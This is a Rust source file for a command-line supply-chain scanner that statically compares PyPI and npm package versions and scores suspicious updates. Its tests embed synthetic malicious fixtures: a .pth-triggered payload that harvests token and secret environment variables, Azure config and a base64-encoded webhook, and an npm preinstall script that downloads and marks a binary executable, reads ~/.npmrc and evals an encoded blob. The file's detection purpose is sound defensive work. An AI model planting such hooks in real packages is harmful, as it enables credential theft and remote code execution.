//! `kanmonctl inspect`：パッケージの更新差分を静的に調べ、点数を付けて表示する。
//! パッケージのコードは実行も import もしない。アーカイブはディスクに展開しない。

pub mod archive;
pub mod fetch;

use anyhow::{bail, Context, Result};
use kanmon_core::detect::DetectionSet;
use kanmon_core::inspect::event::{analyze, to_event};
use kanmon_core::inspect::features::Lists;
use kanmon_core::inspect::{excerpt_of, parse_spec, Ecosystem, Finding, Limits, Meta};
use kanmon_core::rules::RuleSet;
use kanmon_core::scoring::{self, Level, Thresholds};
use serde_json::{json, Value};
use std::path::{Path, PathBuf};

pub struct Args {
    pub spec: Option<String>,
    pub base: Option<String>,
    pub file: Option<PathBuf>,
    pub base_file: Option<PathBuf>,
    pub eco: Option<String>,
    pub detections: PathBuf,
    pub json: bool,
    pub all: bool,
    /// 新しく増えた依存をレジストリで調べる（パッケージ指定では常に。--file では --check-deps のときだけ）
    pub check_deps: bool,
    /// 「いつの時点で調べたことにするか」（過去の事件の振り返り用）。None なら今
    pub as_of: Option<i64>,
}

/// 依存が、調べている本体と同じ「家族」か（`typescript` と `@typescript/…`、`foo` と `foo-bar`）。
/// 本体が分かれたプラットフォーム別のパッケージを新しく足すのは普通にあるので、出来たばかりでも重くしない。
/// スコープ付きの本体（`@mastra/rag`）の同じスコープの依存は除外しない（乗っ取られたアカウントは同じスコープに出せる）
pub fn same_family(pkg: &str, dep: &str) -> bool {
    if pkg.starts_with('@') {
        return false;
    }
    dep.starts_with(&format!("@{pkg}/")) || dep.starts_with(&format!("{pkg}-"))
}

/// 新しい依存の上限（1 回の検査でレジストリに問い合わせる数）
const MAX_DEP_LOOKUPS: usize = 10;
/// 依存の初公開がこれより新しければ「出来たばかりの依存」とする
const YOUNG_DEP_DAYS: i64 = 30;

/// 結果（表示と終了コードの元）
pub struct Report {
    pub eco: Ecosystem,
    pub meta: Meta,
    pub score: i32,
    pub level: Level,
    pub signals: Vec<kanmon_core::detect::SignalHit>,
    pub findings: Vec<Finding>,
}

/// 終了コード：0 = warn 未満、2 = warn 以上、3 = critical（1 は実行エラーで main が返す）
pub fn exit_code(level: Level) -> i32 {
    match level {
        Level::Critical => 3,
        Level::Warn => 2,
        _ => 0,
    }
}

fn read_file(p: &Path, lim: &Limits) -> Result<Vec<u8>> {
    let md = std::fs::metadata(p).with_context(|| format!("{} を読めません", p.display()))?;
    if md.len() > lim.max_compressed {
        bail!("{} が大きすぎます（上限 {} バイト）", p.display(), lim.max_compressed);
    }
    Ok(std::fs::read(p)?)
}

fn infer_eco(p: &Path) -> Option<Ecosystem> {
    let n = p.file_name()?.to_str()?.to_ascii_lowercase();
    if n.ends_with(".whl") {
        Some(Ecosystem::Pypi)
    } else if n.ends_with(".tgz") {
        Some(Ecosystem::Npm)
    } else {
        None
    }
}

/// 調べる（表示はしない）。`fetcher` は `--file` のときは使わない
pub fn inspect(a: &Args, fetcher: &dyn fetch::Fetcher, now: i64) -> Result<Report> {
    let lim = Limits::default();
    let dets = DetectionSet::load_dir(&a.detections, false)
        .with_context(|| format!("検知ルール {} を読めません", a.detections.display()))?;
    let (eco, meta, new_bytes, old_bytes) = match (&a.spec, &a.file) {
        (Some(spec), None) => {
            let (eco, name, ver) = parse_spec(spec)?;
            let r = fetch::resolve(fetcher, eco, &name, ver.as_deref(), a.base.as_deref())?;
            let new = fetch::download(fetcher, &r.target, lim.max_compressed)?;
            let old = match &r.base {
                Some(b) => Some(fetch::download(fetcher, b, lim.max_compressed)?),
                None => None,
            };
            (eco, r.meta, new, old)
        }
        (None, Some(file)) => {
            let eco = match a.eco.as_deref() {
                Some("pypi") => Ecosystem::Pypi,
                Some("npm") => Ecosystem::Npm,
                Some(x) => bail!("--eco は pypi か npm です（{x}）"),
                None => infer_eco(file)
                    .ok_or_else(|| anyhow::anyhow!("形式が分かりません。--eco pypi か --eco npm を付けてください"))?,
            };
            let name = file.file_name().and_then(|n| n.to_str()).unwrap_or("(file)").to_string();
            let meta = Meta {
                name,
                version: String::new(),
                base_version: a.base_file.as_ref().map(|b| b.display().to_string()),
                ..Default::default()
            };
            let old = a.base_file.as_deref().map(|b| read_file(b, &lim)).transpose()?;
            (eco, meta, read_file(file, &lim)?, old)
        }
        (Some(_), Some(_)) => bail!("パッケージの指定と --file は同時に使えません"),
        (None, None) => bail!("`pypi:名前==版`・`npm:名前@版` か --file を指定してください"),
    };
    let new = archive::read_archive(&new_bytes, &lim).context("対象のアーカイブ")?;
    let old = old_bytes.map(|b| archive::read_archive(&b, &lim)).transpose().context("比較する版のアーカイブ")?;
    // 所見は対象の版のものだけ（比較する版のアーカイブの不正は、今回の更新の評価に入れない）
    let pre = new.findings;
    let lists = Lists {
        exfil: dets.list("exfil_services"),
        chain_rpc: dets.list("chain_rpc"),
        chain_rpc_suffixes: dets.list("chain_rpc_suffixes"),
    };
    let mut findings = analyze(eco, new.entries, old.map(|o| o.entries), &meta, now, &lists, pre);
    // 新しく増えた依存が、出来たばかり・レジストリに無い（取り下げ済み）なら、本体を依存に置く手口を疑う
    let online = a.spec.is_some() || a.check_deps;
    if online {
        let base_time = a.as_of.or(meta.published).unwrap_or(now);
        let deps: Vec<String> = findings
            .iter()
            .filter(|f| f.feature == "new_dependency")
            .map(|f| f.excerpt.clone())
            .filter(|d| !same_family(&meta.name, d))
            .take(MAX_DEP_LOOKUPS)
            .collect();
        for d in deps {
            match fetch::first_published(fetcher, eco, &d) {
                Ok(None) => findings.push(Finding::new(
                    "new_dep_young",
                    "依存",
                    None,
                    &format!("{d}（レジストリに無い：取り下げ済みの可能性）"),
                )),
                Ok(Some(t)) if base_time - t < YOUNG_DEP_DAYS * 86_400 => findings.push(Finding::new(
                    "new_dep_young",
                    "依存",
                    None,
                    &format!("{d}（初公開から {} 日）", ((base_time - t).max(0)) / 86_400),
                )),
                Ok(Some(_)) => {}
                Err(e) => eprintln!("依存 {d} を調べられません: {e}"),
            }
        }
    }
    let mut ev = to_event(eco, &meta, &findings);
    let out = scoring::apply(&mut ev, &dets, &RuleSet::default(), &Thresholds::default());
    Ok(Report { eco, meta, score: out.score, level: out.level, signals: out.signals, findings })
}

pub fn to_json(r: &Report) -> Value {
    json!({
        "ecosystem": r.eco.as_str(),
        "meta": r.meta,
        "score": r.score,
        "level": r.level.as_str(),
        "signals": r.signals,
        "findings": r.findings,
    })
}

/// 人が読む表示
pub fn render(r: &Report, all: bool) -> String {
    let mut s = String::new();
    let base = r.meta.base_version.as_deref().map(|b| format!("{} → ", excerpt_of(b))).unwrap_or_default();
    s.push_str(&format!(
        "{} {} {}{}  点数 {}  {}\n",
        r.eco.as_str(),
        excerpt_of(&r.meta.name),
        base,
        excerpt_of(&r.meta.version),
        r.score,
        r.level.as_str()
    ));
    if r.meta.base_version.is_none() {
        s.push_str("（比較する版が無いので、全ファイルを調べました）\n");
    }
    if r.signals.is_empty() {
        s.push_str("\n該当した検知ルールはありません\n");
    } else {
        s.push_str("\n該当した検知ルール:\n");
        for h in &r.signals {
            s.push_str(&format!("  {:<4} {:+}  {}\n", h.id, h.points, h.description));
        }
    }
    let mut feats: Vec<&str> = r.findings.iter().map(|f| f.feature.as_str()).collect();
    feats.sort();
    feats.dedup();
    if !feats.is_empty() {
        s.push_str("\n所見:\n");
    }
    for f in feats {
        let items: Vec<&Finding> = r.findings.iter().filter(|x| x.feature == f).collect();
        s.push_str(&format!("  [{f}] {} 件\n", items.len()));
        let n = if all { items.len() } else { items.len().min(3) };
        for x in &items[..n] {
            let loc = match x.line {
                Some(l) => format!("{}:{l}", excerpt_of(&x.path)),
                None => excerpt_of(&x.path),
            };
            s.push_str(&format!("    {loc}  {}\n", excerpt_of(&x.excerpt)));
        }
        if n < items.len() {
            s.push_str(&format!("    …ほか {} 件（--all で全部）\n", items.len() - n));
        }
    }
    s.push_str("\nkanmon はパッケージのコードを実行・展開していません（読んだだけです）\n");
    s
}

/// サブコマンドの本体。終了コードを返す
pub fn run(a: Args) -> Result<i32> {
    let now = a.as_of.unwrap_or_else(|| chrono::Utc::now().timestamp());
    let f = fetch::HttpFetcher::new();
    let r = inspect(&a, &f, now)?;
    if a.json {
        println!("{}", serde_json::to_string_pretty(&to_json(&r))?);
    } else {
        print!("{}", render(&r, a.all));
    }
    Ok(exit_code(r.level))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::{Cursor, Write};

    fn wheel(files: &[(&str, &str)]) -> Vec<u8> {
        let mut w = zip::ZipWriter::new(Cursor::new(vec![]));
        let o = zip::write::SimpleFileOptions::default();
        for (p, d) in files {
            w.start_file(*p, o).unwrap();
            w.write_all(d.as_bytes()).unwrap();
        }
        w.finish().unwrap().into_inner()
    }

    fn tgz(files: &[(&str, &str)]) -> Vec<u8> {
        let gz = flate2::write::GzEncoder::new(vec![], flate2::Compression::default());
        let mut b = tar::Builder::new(gz);
        for (p, d) in files {
            let mut h = tar::Header::new_gnu();
            h.set_size(d.len() as u64);
            h.set_mode(0o644);
            b.append_data(&mut h, p, d.as_bytes()).unwrap();
        }
        b.into_inner().unwrap().finish().unwrap()
    }

    struct NoNet;
    impl fetch::Fetcher for NoNet {
        fn get(&self, _: &str, _: u64) -> Result<Vec<u8>> {
            bail!("テストではネットワークを使わない")
        }
    }

    fn root() -> PathBuf {
        PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../..")
    }

    /// `tag` はテストごとに変える（テストは並行に動くので、同じディレクトリを使うと上書きし合う）
    fn run_files(tag: &str, new: &[u8], old: &[u8], ext: &str) -> Report {
        let d = std::env::temp_dir().join(format!("kanmon-insp-{}-{tag}", std::process::id()));
        std::fs::create_dir_all(&d).unwrap();
        let (n, o) = (d.join(format!("new.{ext}")), d.join(format!("old.{ext}")));
        std::fs::write(&n, new).unwrap();
        std::fs::write(&o, old).unwrap();
        let a = Args {
            spec: None,
            base: None,
            file: Some(n),
            base_file: Some(o),
            eco: None,
            detections: root().join("detections"),
            json: false,
            all: false,
            check_deps: false,
            as_of: None,
        };
        let r = inspect(&a, &NoNet, 0).unwrap();
        std::fs::remove_dir_all(&d).ok();
        r
    }

    #[test]
    fn agent_framework_like_wheel_is_critical() {
        // 2026-11 の agent-framework の手口をまねた合成の wheel（実物ではない。宛先は文字列として書くだけ）
        let old = wheel(&[("af/__init__.py", "x = 1\n"), ("af-1.0.dist-info/RECORD", "a")]);
        let payload = "import os, base64\n\
            def _start():\n\
            \x20   if os.fork() == 0:\n\
            \x20       os.setsid()\n\
            \x20       env = {k: v for k, v in os.environ.items() if 'TOKEN' in k or 'SECRET' in k}\n\
            \x20       open(os.path.expanduser('~/.azure/config.json'))\n\
            \x20       u = base64.b64decode('aHR0cHM6Ly93ZWJob29rLnNpdGUvdGVzdA==')\n";
        let new = wheel(&[
            ("af/__init__.py", "x = 1\n"),
            ("af-1.1.dist-info/RECORD", "b"),
            ("af_meta.pth", "import af_meta\n"),
            ("af_meta/__init__.py", payload),
        ]);
        let r = run_files("af", &new, &old, "whl");
        assert_eq!(r.level, Level::Critical, "{} {:?}", r.score, r.signals);
        assert_eq!(exit_code(r.level), 3);
        let out = render(&r, false);
        assert!(out.contains("pth_exec") && out.contains("af_meta.pth"), "{out}");
    }

    #[test]
    fn keyv_like_tgz_is_critical() {
        let old = tgz(&[
            ("package/package.json", r#"{"name":"k","main":"dist/index.js"}"#),
            ("package/dist/index.js", "module.exports = 1;\n"),
        ]);
        let setup = "require('child_process').execSync('curl -fsSL https://github.com/x/y/releases/download/v1/bun -o /tmp/b && chmod +x /tmp/b');\n\
                     const rpc = 'https://eth.llamarpc.com';\n\
                     const p = require('os').homedir() + '/.npmrc';\n\
                     eval(atob(blob));\n";
        let new = tgz(&[
            (
                "package/package.json",
                r#"{"name":"k","main":"dist/index.js","scripts":{"preinstall":"node setup.mjs"}}"#,
            ),
            ("package/dist/index.js", "module.exports = 1;\n"),
            ("package/setup.mjs", setup),
        ]);
        let r = run_files("keyv", &new, &old, "tgz");
        assert_eq!(r.level, Level::Critical, "{} {:?}", r.score, r.signals);
    }

    #[test]
    fn benign_update_is_quiet() {
        let old = wheel(&[("pkg/__init__.py", "__version__ = '1.0'\n"), ("pkg/util.py", "def f():\n    return 1\n")]);
        let new = wheel(&[
            ("pkg/__init__.py", "__version__ = '1.1'\n"),
            ("pkg/util.py", "import os\ndef f():\n    return os.environ.get('HOME', '')\n"),
            ("pkg/extra.py", "URL = 'https://pypi.org/simple/'\n"),
        ]);
        let r = run_files("benign", &new, &old, "whl");
        assert_eq!(r.level, Level::Info, "{} {:?} {:?}", r.score, r.signals, r.findings);
        assert_eq!(exit_code(r.level), 0);
    }

    #[test]
    fn render_strips_control_chars() {
        let r = Report {
            eco: Ecosystem::Npm,
            meta: Meta { name: "x\x1b[2J".into(), version: "1".into(), ..Default::default() },
            score: 0,
            level: Level::Info,
            signals: vec![],
            findings: vec![Finding {
                feature: "obfuscation".into(),
                path: "a\x1b]0;t\x07.js".into(),
                line: Some(1),
                excerpt: "\x1b[31mred".into(),
            }],
        };
        let s = render(&r, false);
        assert!(!s.contains('\x1b') && !s.contains('\x07'), "{s:?}");
    }

    #[test]
    fn family() {
        assert!(same_family("typescript", "@typescript/native-preview"));
        assert!(same_family("esbuild", "esbuild-darwin-arm64"));
        assert!(!same_family("@mastra/rag", "@mastra/setup"));
        assert!(!same_family("@mastra/rag", "easy-day-js"));
        assert!(!same_family("dayjs", "easy-day-js"));
    }

    #[test]
    fn needs_spec_or_file() {
        let a = Args {
            spec: None,
            base: None,
            file: None,
            base_file: None,
            eco: None,
            detections: root().join("detections"),
            json: false,
            all: false,
            check_deps: false,
            as_of: None,
        };
        assert!(inspect(&a, &NoNet, 0).is_err());
    }
}
